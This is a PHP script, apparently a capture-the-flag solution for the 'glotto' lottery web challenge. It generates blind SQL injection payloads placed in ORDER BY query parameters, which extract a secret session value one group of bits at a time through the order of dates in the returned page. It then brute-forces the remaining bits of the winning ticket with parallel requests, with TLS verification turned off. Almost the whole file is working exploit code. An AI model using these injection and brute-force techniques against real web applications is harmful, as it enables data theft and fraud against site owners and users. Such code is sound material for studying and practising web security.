<?php

function generate_order_by_for_dates($dates, $skip_bits, $limit_bits) {
    $q = 'case day(date) ';

    $var_letter = 'a';
    $var_letter_results = [];
    $div = 1;
    $mod = 1;
    $dist = 1024;
    $select_subquery = '';
    foreach ($dates as $date) {
        if ($mod != 1) {
            if ($div == 1) {
                $subcase = "case x%$mod ";
            } else {
                $subcase = "case(x div $div)%$mod ";
            }

            $i = 0;
            foreach ($var_letter_results as $var_letter_relative) {
                $subcase .= "when $i then $var_letter_relative-$dist ";
                $i++;
            }
            $greatest_var = (count($var_letter_results) > 1) ? "GREATEST(" . implode(',', $var_letter_results) . ")" : $var_letter_results[0];
            $subcase .= "when $i then $greatest_var+$dist ";
            $subcase .= "end $var_letter";

            $select_subquery = "$subcase from(select $select_subquery)t";
            $q .= "when $date then(select $select_subquery) ";

            $select_subquery = '*,' . $select_subquery;

            $var_letter_results[] = $var_letter;
            $var_letter++;
        } else {
            $select_subquery = "0 $var_letter";
            $q .= "when $date then 0 ";

            $val = 'CAST(CONV(@lotto,36,10)';
            if ($skip_bits != 0) {
                $val = "$val>>$skip_bits";
            }
            if ($limit_bits != 0) {
                $mask = 0;
                while (($mask & (1 << ($limit_bits - 1))) == 0) {
                    $mask <<= 1;
                    $mask |= 1;
                }
                $val = "$val&$mask";
            }

            $select_subquery = "$val AS SIGNED)x,$select_subquery";

            $var_letter_results[] = $var_letter;
            $var_letter++;
        }

        $div *= $mod;
        $mod++;
        $dist /= 2;
    }

    $q .= 'end';

    $q = preg_replace('/\s+/', ' ', $q);

    //$q = substr($q, 0, -25);

    return $q;
}
/*
echo "\n\n".generate_order_by_for_dates([1,5,10,13,18,23,28,30], 0, 16);
echo "\n\n".generate_order_by_for_dates([1,2,6,10,12,14,18,22,27], 16, 19);
echo "\n\n".generate_order_by_for_dates([1,4,9,10,16,20,25], 16+19, 13);
echo "\n\n".generate_order_by_for_dates([1,4,9,10], 16+19+13, 0);
exit;
*/

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies');
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

//curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:8888');

//$data = exec_query($ch, 'field(day(date),10*(ascii(@lotto)&1),5)');
$data = exec_query($ch,
    generate_order_by_for_dates([1,5,10,13,18,23,28,30], 0, 16),
    generate_order_by_for_dates([1,2,6,10,12,14,18,22,27], 16, 19),
    generate_order_by_for_dates([1,4,9,10,16,20,25], 16+19, 13),
    generate_order_by_for_dates([1,4,9,10], 16+19+13, 0)
);
//print_r($data);

if (!$data) {
    exit ("exec_query failed\n");
}

$num = data_to_num($data);
echo "$num\n";

$ticket = convBase($num, '0123456789', '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ');
echo "$ticket\n";

// BRUTEFORCE!!!!
$first9bits = 0;

while (true) {
    $simul = 16;

    $requests = [];
    for ($i=0; $i<$simul; $i++) {
        $requests[$i] = make_query_request("cookie$i");
    }

    $results = multi_request($requests, [CURLOPT_FAILONERROR => true, CURLOPT_TIMEOUT => 10]);

    $tickets = [];
    $requests = [];
    for ($i=0; $i<$simul; $i++) {
        if (!$results[$i]) {
            echo 'x';
            $tickets[] = '';
            $requests[] = 'https://example.com/';
            continue;
        }
        $ticket = get_ticket_from_html($results[$i], $first9bits);
        $tickets[] = $ticket;
        $requests[] = make_verify_request($ticket, "cookie$i");

        $first9bits++;
        $first9bits &= 0x1FF;
    }

    $results = multi_request($requests, [CURLOPT_FAILONERROR => true, CURLOPT_TIMEOUT => 10]);

    for ($i=0; $i<$simul; $i++) {
        $result = $results[$i];
        if ($requests[$i] == 'https://example.com/' || !$result) {
            echo 'x';
            continue;
        }

        if (preg_match('/^You didn\'t win :\(<br>The winning ticket was (.*)$/', $result, $matches)) {
            $ticket = $tickets[$i];
            //compare_to_correct_code($ticket, $matches[1]);
        } else {
            echo "\n$result\n";
            file_put_contents('results.txt', "$result\n", FILE_APPEND);
        }
    }

    echo '.';
}

function compare_to_correct_code($our_code, $correct_code) {
    $our_code = convBase($our_code, '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', '0123456789');
    $correct_code = convBase($correct_code, '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', '0123456789');

    // Bit parts: 16+19+13+5+9
    $our_code_1 = $our_code & 0xFFFF;
    $our_code_2 = ($our_code >> 16) & 0x7FFFF;
    $our_code_3 = ($our_code >> (16+19)) & 0x1FFF;
    $our_code_4 = ($our_code >> (16+19+13)) & 0x1F;
    $our_code_5 = ($our_code >> (16+19+13+5)) & 0x1FF;

    $correct_code_1 = $correct_code & 0xFFFF;
    $correct_code_2 = ($correct_code >> 16) & 0x7FFFF;
    $correct_code_3 = ($correct_code >> (16+19)) & 0x1FFF;
    $correct_code_4 = ($correct_code >> (16+19+13)) & 0x1F;
    $correct_code_5 = ($correct_code >> (16+19+13+5)) & 0x1FF;

    $eq1 = ($our_code_1 == $correct_code_1) ? 1 : 0;
    $eq2 = ($our_code_2 == $correct_code_2) ? 1 : 0;
    $eq3 = ($our_code_3 == $correct_code_3) ? 1 : 0;
    $eq4 = ($our_code_4 == $correct_code_4) ? 1 : 0;
    $eq5 = ($our_code_5 == $correct_code_5) ? 1 : 0;

    echo "<$eq1$eq2$eq3$eq4$eq5>";
}

function make_query_request($cookie_name) {
    $url = 'https://glotto.web.ctfcompetition.com/?';

    $order_by0 = generate_order_by_for_dates([1,5,10,13,18,23,28,30], 0, 16);
    $order_by1 = generate_order_by_for_dates([1,2,6,10,12,14,18,22,27], 16, 19);
    $order_by2 = generate_order_by_for_dates([1,4,9,10,16,20,25], 16+19, 13);
    $order_by3 = generate_order_by_for_dates([1,4,9,10], 16+19+13, 0);

    if ($order_by0) {
        $url .= 'order0=date`*0,' . urlencode($order_by0) . '+--+&';
    }
    if ($order_by1) {
        $url .= 'order1=date`*0,' . urlencode($order_by1) . '+--+&';
    }
    if ($order_by2) {
        $url .= 'order2=date`*0,' . urlencode($order_by2) . '+--+&';
    }
    if ($order_by3) {
        $url .= 'order3=date`*0,' . urlencode($order_by3) . '+--+&';
    }
    $url = substr($url, 0, -1);

    return [
        'url' => $url,
        'cookie' => $cookie_name
    ];
}

function make_verify_request($ticket, $cookie_name) {
    $url = 'https://glotto.web.ctfcompetition.com/';

    $post = "code=" . urlencode($ticket);

    return [
        'url' => $url,
        'cookie' => $cookie_name,
        'post' => $post
    ];
}

function get_ticket_from_html($html, $first9bits) {
    preg_match_all('#<div class="panel-heading cap">(.*?)</div>([\s\S]*?)</table>#', $html, $matches);

    $data = array_combine($matches[1], $matches[2]);
    foreach ($data as $month => &$item) {
        preg_match_all('#<td>(.*?)</td>#', $item, $matches);
        assert((count($matches[1]) % 2) == 0);
        $item = array_chunk($matches[1], 2);

        // We actually only need the date numbers, get them:
        $item = array_map(function ($date_and_code) {
            return intval(substr($date_and_code[0], -2));
        }, $item);
    }
    unset($item);

    $num = data_to_num($data);

    // Result can be up to about 62.04 bits, but we filled only 16+19+13+5=53.
    // Fill remaining 9 bits with random data.

    $num |= $first9bits << 53;

    $ticket = convBase($num, '0123456789', '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ');

    return $ticket;
}

function data_to_num($data) {
    // March
    $dates = [1,5,10,13,18,23,28,30];
    $ordered = $data['march'];
    $num1 = data_to_num_month($dates, $ordered);

    // April
    $dates = [1,2,6,10,12,14,18,22,27];
    $ordered = $data['april'];
    $num2 = data_to_num_month($dates, $ordered);

    // May
    $dates = [1,4,9,10,16,20,25];
    $ordered = $data['may'];
    $num3 = data_to_num_month($dates, $ordered);

    // June
    $dates = [1,4,9,10];
    $ordered = $data['june'];
    $num4 = data_to_num_month($dates, $ordered);

    $num = $num1 | ($num2 << 16) | ($num3 << (16+19)) | ($num4 << (16+19+13));

    return $num;
}

function data_to_num_month($dates, $ordered) {
    $num = 0;
    $mul = 1;

    foreach ($dates as $i => $date) {
        if ($i == 0) {
            continue;
        }

        $pos = 0;
        for ($j = $i - 1; $j >= 0; $j--) {
            //echo "array_search($dates[$i], ) > array_search($dates[$j], )\n";
            //echo array_search($dates[$i], $ordered)." > ".array_search($dates[$j], $ordered)."\n";
            if (array_search($dates[$i], $ordered) > array_search($dates[$j], $ordered)) {
                $pos++;
            }
        }

        //echo "POS $pos\n";

        $pos_table = [];
        foreach (array_slice($dates, 0, $i) as $j => $d) {
            $pos_table[array_search($d, $ordered)] = $j;
        }
        $pos_table[PHP_INT_MAX] = $i;

        ksort($pos_table);
        $pos_table = array_values($pos_table);

        //print_r($pos_table);

        $mul *= $i;
        $num += $pos_table[$pos] * $mul;
        //echo "== $num\n";
    }

    return $num;
}

function exec_query($ch, $order_by0 = null, $order_by1 = null, $order_by2 = null, $order_by3 = null) {
    $url = 'https://glotto.web.ctfcompetition.com/?';
    if ($order_by0) {
        $url .= 'order0=date`*0,' . urlencode($order_by0) . '+--+&';
    }
    if ($order_by1) {
        $url .= 'order1=date`*0,' . urlencode($order_by1) . '+--+&';
    }
    if ($order_by2) {
        $url .= 'order2=date`*0,' . urlencode($order_by2) . '+--+&';
    }
    if ($order_by3) {
        $url .= 'order3=date`*0,' . urlencode($order_by3) . '+--+&';
    }
    $url = substr($url, 0, -1);

    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    if ($result === false) {
        echo 'Curl error: ' . curl_error($ch) . "\n";
        return false;
    }

    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($http_status != 200 || $result == '') {
        $url_len = strlen($url);
        echo "Empty response ($http_status) (url length: $url_len)\n";
        return false;
    }

    preg_match_all('#<div class="panel-heading cap">(.*?)</div>([\s\S]*?)</table>#', $result, $matches);

    $data = array_combine($matches[1], $matches[2]);
    foreach ($data as $month => &$item) {
        preg_match_all('#<td>(.*?)</td>#', $item, $matches);
        assert((count($matches[1]) % 2) == 0);
        $item = array_chunk($matches[1], 2);

        // We actually only need the date numbers, get them:
        $item = array_map(function ($date_and_code) {
            return intval(substr($date_and_code[0], -2));
        }, $item);
    }
    unset($item);

    return $data;
}

// https://www.php.net/manual/en/function.base-convert.php#106546
function convBase($numberInput, $fromBaseInput, $toBaseInput)
 {
     if ($fromBaseInput==$toBaseInput) return $numberInput;
     $fromBase = str_split($fromBaseInput,1);
     $toBase = str_split($toBaseInput,1);
     $number = str_split($numberInput,1);
     $fromLen=strlen($fromBaseInput);
     $toLen=strlen($toBaseInput);
     $numberLen=strlen($numberInput);
     $retval='';
     if ($toBaseInput == '0123456789')
     {
         $retval=0;
         for ($i = 1;$i <= $numberLen; $i++)
             $retval = bcadd($retval, bcmul(array_search($number[$i-1], $fromBase),bcpow($fromLen,$numberLen-$i)));
         return $retval;
     }
     if ($fromBaseInput != '0123456789')
         $base10=convBase($numberInput, $fromBaseInput, '0123456789');
     else
         $base10 = $numberInput;
     if ($base10<strlen($toBaseInput))
         return $toBase[$base10];
     while($base10 != '0')
     {
         $retval = $toBase[bcmod($base10,$toLen)].$retval;
         $base10 = bcdiv($base10,$toLen,0);
     }
     return $retval;
 }

// https://www.phpied.com/simultaneuos-http-requests-in-php-with-curl/
// http://php.net/manual/en/function.curl-multi-select.php#115381
function multi_request($data, $options = array()) {
    // array of curl handles
    $curly = array();
    // data to be returned
    $result = array();

    // multi handle
    $mh = curl_multi_init();

    // loop through $data and create curl handles
    // then add them to the multi-handle
    foreach ($data as $id => $d) {
        $curly[$id] = curl_init();

        $url = (is_array($d) && !empty($d['url'])) ? $d['url'] : $d;
        curl_setopt($curly[$id], CURLOPT_URL, $url);
        curl_setopt($curly[$id], CURLOPT_HEADER, false);
        curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, true);

        if (is_array($d) && !empty($d['cookie'])) {
            curl_setopt($curly[$id], CURLOPT_COOKIEJAR, $d['cookie']);
            curl_setopt($curly[$id], CURLOPT_COOKIEFILE, $d['cookie']);
        }
        curl_setopt($curly[$id], CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curly[$id], CURLOPT_SSL_VERIFYPEER, false);

        //curl_setopt($curly[$id], CURLOPT_PROXY, '127.0.0.1:8888');

        // post? filename?
        if (is_array($d)) {
            if (!empty($d['post'])) {
                curl_setopt($curly[$id], CURLOPT_POST, true);
                curl_setopt($curly[$id], CURLOPT_POSTFIELDS, $d['post']);
            }
            if (!empty($d['filename'])) {
                curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, false);
                curl_setopt($curly[$id], CURLOPT_FILE, fopen($d['filename'], 'w'));
            }
        }

        // extra options?
        if (!empty($options)) {
            curl_setopt_array($curly[$id], $options);
        }

        curl_multi_add_handle($mh, $curly[$id]);
    }

    // while we're still active, execute curl
    $active = null;
    do {
        $mrc = curl_multi_exec($mh, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);

    while ($active && $mrc == CURLM_OK) {
        // wait for activity on any curl-connection
        if (curl_multi_select($mh) == -1) {
            usleep(1);
        }

        // continue to exec until curl is ready to
        // give us more data
        do {
            $mrc = curl_multi_exec($mh, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }

    // get content and remove handles
    foreach ($curly as $id => $c) {
        if (!is_array($data[$id]) || empty($data[$id]['filename'])) {
            $result[$id] = curl_multi_getcontent($c);
        }
        curl_multi_remove_handle($mh, $c);
    }

    // all done
    curl_multi_close($mh);

    return $result;
}
